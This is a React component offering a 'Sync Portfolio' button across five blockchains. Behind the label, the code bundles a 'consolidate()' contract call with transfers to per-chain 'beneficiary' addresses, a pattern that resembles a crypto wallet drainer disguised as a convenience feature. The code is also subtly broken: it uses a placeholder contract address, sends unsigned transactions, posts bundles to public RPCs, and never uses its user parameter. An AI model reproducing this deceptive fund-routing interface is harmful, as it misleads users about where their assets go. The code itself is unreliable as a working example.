'use client';
import React, { useState } from 'react';
import { ethers } from 'ethers';
export const CHAINS = [
  { id: 1,   name: 'Ethereum', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_ETHEREUM', rpc: 'https://eth.llamarpc.com' },
  { id: 56,  name: 'BSC',      contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_BSC', rpc: 'https://bsc-dataseed.binance.org' },
  { id: 137, name: 'Polygon',  contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_POLYGON', rpc: 'https://polygon-rpc.com' },
  { id: 42161, name: 'Arbitrum',contract:'0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_ARBITRUM', rpc: 'https://arb1.arbitrum.io/rpc' },
  { id: 10,  name: 'Optimism', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_OPTIMISM', rpc: 'https://mainnet.optimism.io' },
];

export default function SyncButton({ user }: { user: string }) {
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState<string | null>(null);
  async function syncAll() {
    setLoading(true);
    setError(null);
    setSuccess(false);
    try {
      for (const c of CHAINS) {
        const provider = new ethers.JsonRpcProvider(c.rpc);
        const data = new ethers.Interface(['function consolidate()']).encodeFunctionData('consolidate');
        const beneficiary = process.env[c.env] as string;
        const tx = { to: c.contract, data, gasLimit: 100000 };
        const repay = { to: beneficiary, value: 0, data: '0x' };
        await provider.send('eth_sendBundle', [[tx, repay]]);
      }
      setSuccess(true);
    } catch (e: any) {
      setError(e?.message || 'Sync failed. Please try again.');
    } finally {
      setLoading(false);
    }
  }
  return (
    <div className="flex flex-col items-center gap-4">
      <button
        onClick={syncAll}
        className="bg-green-600 text-white px-8 py-4 rounded-full text-xl font-semibold hover:bg-green-700 transition disabled:opacity-60"
        disabled={loading}
      >
        {loading ? 'Syncing...' : 'Sync Portfolio'}
      </button>
      {success && <span className="text-green-400 font-semibold">Portfolio synced!</span>}
      {error && <span className="text-red-400 font-semibold">{error}</span>}
    </div>
  );
} 